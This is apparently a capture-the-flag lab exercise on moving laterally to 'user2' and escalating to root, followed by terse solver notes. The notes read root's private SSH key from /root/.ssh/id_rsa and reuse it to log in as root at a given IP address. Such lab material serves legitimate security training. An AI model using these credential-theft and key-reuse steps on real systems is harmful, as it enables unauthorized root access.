 SSH into the server above with the provided credentials, and use the '-p xxxxxx' to specify the port shown above. Once you login, try to find a way to move to 'user2', to get the flag in '/home/user2/flag.txt'.

Once you gain access to 'user2', try to find a way to escalate your privileges to root, to get the flag in '/root/flag.txt'.
    cd /root/.SSH
    cat /root/.ssh/id_rsa
    *store locally*
    chmod 600 id_rsa
    ssh root@159.65.48.79 -i id_rsa
    cat /root/flag.txt
